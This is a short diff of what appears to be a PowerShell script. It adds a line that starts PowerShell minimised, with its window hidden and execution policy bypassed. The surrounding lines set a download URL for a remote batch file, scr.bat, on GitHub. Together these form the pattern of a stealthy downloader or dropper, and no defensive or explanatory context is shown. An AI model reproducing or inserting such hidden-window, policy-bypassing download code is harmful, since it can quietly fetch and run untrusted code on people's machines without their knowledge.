@@ -1,3 +1,4 @@
+cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"
 # URL of the file to download
 $url = "https://github.com/KevinDark5/data/raw/refs/heads/main/scr.bat"
 
